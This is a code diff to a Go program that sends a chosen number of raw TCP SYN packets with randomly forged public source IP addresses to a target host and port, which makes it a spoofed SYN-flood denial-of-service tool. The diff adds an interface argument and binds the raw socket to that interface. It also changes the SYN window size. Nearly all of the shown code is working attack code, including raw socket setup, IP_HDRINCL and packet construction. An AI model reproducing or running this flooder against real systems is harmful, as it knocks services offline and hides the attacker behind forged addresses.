@@ -13,9 +13,10 @@ import (
 
 func main() {
 	if len(os.Args) != 5 {
-		log.Fatalf("Usage: %s <host> <port> <packets>", os.Args[0])
+		log.Fatalf("Usage: %s <interface> <host> <port> <packets> %v", os.Args[0], len(os.Args))
 	}
 
+	ifaceName := os.Args[1]
 	host := os.Args[2]
 	port, err := strconv.Atoi(os.Args[3])
 	if err != nil {
@@ -31,17 +32,28 @@ func main() {
 
 	for i := 0; i < packets; i++ {
 		srcIP := generateRandomPublicIP()
-		sendTCPSYN(srcIP, dstIP, dstPort)
+		sendTCPSYN(ifaceName, srcIP, dstIP, dstPort)
 	}
 }
 
-func sendTCPSYN(srcIP string, dstIP net.IP, dstPort uint16) {
+func sendTCPSYN(ifaceName, srcIP string, dstIP net.IP, dstPort uint16) {
+	// Resolve the local network interface
+	iface, err := net.InterfaceByName(ifaceName)
+	if err != nil {
+		log.Fatalf("Failed to find interface %s: %v", ifaceName, err)
+	}
+
 	// Create raw socket
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
 		log.Fatalf("Failed to create socket: %v", err)
 	}
 	defer syscall.Close(fd)
+
+	// Bind to the specific interface
+	if err := syscall.BindToDevice(fd, iface.Name); err != nil {
+		log.Fatalf("Failed to bind to interface %s: %v", iface.Name, err)
+	}
 
 	// Set the IP_HDRINCL option so that we can specify our own IP header.
 	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
@@ -88,7 +100,7 @@ func makeTCPSYNPacket(srcIP string, dstIP net.IP, dstPort uint16) []byte {
 	binary.BigEndian.PutUint32(tcpHeader[8:12], 0)                            // Acknowledgement number
 	tcpHeader[12] = 0x50                                                      // Data offset and reserved bits
 	tcpHeader[13] = 0x02                                                      // Flags (SYN)
-	binary.BigEndian.PutUint16(tcpHeader[14:16], 14600)                       // Window size
+	binary.BigEndian.PutUint16(tcpHeader[14:16], 1400)                        // Window size
 	// Checksum and urgent pointer will be calculated later
 
 	// Add the pseudo-header for checksum calculation
